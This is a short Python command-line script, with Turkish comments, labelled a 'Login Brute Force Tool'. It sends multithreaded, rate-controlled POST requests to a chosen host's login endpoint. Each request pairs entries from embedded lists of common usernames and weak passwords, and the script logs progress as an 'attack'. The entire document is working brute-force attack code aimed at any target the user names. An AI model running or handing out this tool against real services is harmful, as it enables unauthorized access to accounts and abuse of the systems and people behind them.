#!/usr/bin/env python3
import requests
import threading
import time
import random
import string
from itertools import cycle

# Embedded username listesi
USERNAMES = [
    "admin", "root", "user", "test", "guest", "admin123", 
    "emir", "test123", "demo", "moderator", "operator",
    "support", "manager", "developer", "api_user", "service"
]

# Embedded password listesi
PASSWORDS = [
    "password", "123456", "admin123", "password123", "test123",
    "qwerty", "letmein", "welcome", "monkey", "dragon",
    "admin", "pass", "12345678", "1q2w3e4r", "root123"
]

# Kombinasyonları döngüye al
username_cycle = cycle(USERNAMES)
password_cycle = cycle(PASSWORDS)

def login_attempt(host, path, port, username, password, timeout=5):
    """Tek bir login denemesi yap"""
    url = f"http://{host}:{port}{path}"
    payload = {
        "username": username,
        "password": password
    }
    
    try:
        response = requests.post(url, json=payload, timeout=timeout)
        return response.status_code, response.text[:50]
    except Exception as e:
        return None, str(e)[:50]

def worker(host, path, port, rps, worker_id, duration=None):
    """Worker thread - belirtilen RPS'de login denemeleri yap"""
    delay = 1.0 / rps
    start_time = time.time()
    attempt_count = 0
    
    while True:
        if duration and (time.time() - start_time) > duration:
            break
        
        # Credential seç (rastgele kombinasyon)
        username = random.choice(USERNAMES)
        password = random.choice(PASSWORDS)
        
        status, response = login_attempt(host, path, port, username, password)
        attempt_count += 1
        
        if attempt_count % 50 == 0:
            print(f"[Worker {worker_id}] İstek: {attempt_count} | Son: {username}:{password} | Status: {status}")
        
        time.sleep(delay)

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Login Brute Force Tool")
    parser.add_argument("-host", required=True, help="Hedef hostname")
    parser.add_argument("-path", default="/api/login", help="Login endpoint path")
    parser.add_argument("-port", type=int, default=80, help="Port")
    parser.add_argument("-threads", type=int, default=1, help="Thread sayısı")
    parser.add_argument("-rps", type=float, default=1.0, help="RPS per thread")
    parser.add_argument("-duration", type=int, default=None, help="Süresi (saniye)")
    
    args = parser.parse_args()
    
    total_rps = args.threads * args.rps
    
    print("[*] ========== Login Brute Force ==========")
    print(f"[*] Hedef: {args.host}:{args.port}{args.path}")
    print(f"[*] Thread Sayısı: {args.threads}")
    print(f"[*] RPS per Thread: {args.rps}")
    print(f"[*] Toplam RPS: {total_rps}")
    print(f"[*] Username Sayısı: {len(USERNAMES)}")
    print(f"[*] Password Sayısı: {len(PASSWORDS)}")
    if args.duration:
        print(f"[*] Süre: {args.duration} saniye")
    print("[*] ========================================")
    print("[*] Attack başlıyor... (Ctrl+C ile dur)\n")
    
    threads = []
    
    try:
        for i in range(args.threads):
            t = threading.Thread(
                target=worker,
                args=(args.host, args.path, args.port, args.rps, i+1, args.duration),
                daemon=True
            )
            t.start()
            threads.append(t)
        
        # Ana thread'i tutmak için
        if args.duration:
            time.sleep(args.duration + 1)
        else:
            while True:
                time.sleep(1)
    
    except KeyboardInterrupt:
        print("\n[!] Attack durduruldu")

if __name__ == "__main__":
    main()
